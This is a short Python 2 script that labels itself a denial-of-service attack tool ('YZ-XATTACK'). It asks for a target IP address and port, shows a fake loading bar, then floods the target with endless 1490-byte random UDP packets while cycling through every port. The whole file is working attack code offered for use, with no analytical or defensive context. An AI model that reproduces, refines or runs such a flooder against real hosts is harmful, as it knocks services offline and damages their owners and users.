import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

print ("|-----------------|")
print ("|DOS ATTACK TOOL -|")
print ("|YZ-XATTACK -------|")
print ("|Powered by yz-----|")
print ("|__________________|")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
ip = raw_input("enter ip adddress NUMBERS ONLY ex : 1.2.3.4 : ")
port = input("enter website port ex : 80 : ")
os.system("figlet YZ-XATTACK")
print ("[LOADING 15%]")
time.sleep(3)
print ("[LOADING 25%]")
time.sleep(3)
print ("[LOADING 50%]")
time.sleep(3)
print ("[LOADING 100%]")
time.sleep (1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port) )
     if port == 65534:
       port = 1